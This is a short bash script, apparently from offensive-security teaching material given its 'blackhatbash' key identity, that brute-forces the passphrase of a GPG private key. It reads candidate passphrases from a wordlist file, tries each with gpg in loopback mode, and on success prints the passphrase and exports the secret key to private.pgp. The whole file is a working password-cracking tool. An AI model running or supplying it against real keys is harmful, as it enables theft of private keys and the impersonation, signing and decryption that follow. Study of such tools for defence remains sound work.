#!/bin/bash
KEY_ID="identity@blackhatbash.com"

if ! gpg --list-keys | grep uid | grep -q "${KEY_ID}"; then
  echo "Could not find identity/key ID ${KEY_ID}"
  exit 1
fi

while read -r passphrase; do
  echo "Brute forcing with ${passphrase}..."
  if echo "${passphrase}" | gpg --batch \
                                --yes \
                                --pinentry-mode loopback \
                                --passphrase-fd 0 \
                                --output private.pgp \
                                --armor \
                                --export-secret-key "${KEY_ID}"; then
       echo "Passphrase is: ${passphrase}"
       echo "Private key is located at private.pgp"
       exit 0
  fi
done < passphrases.txt
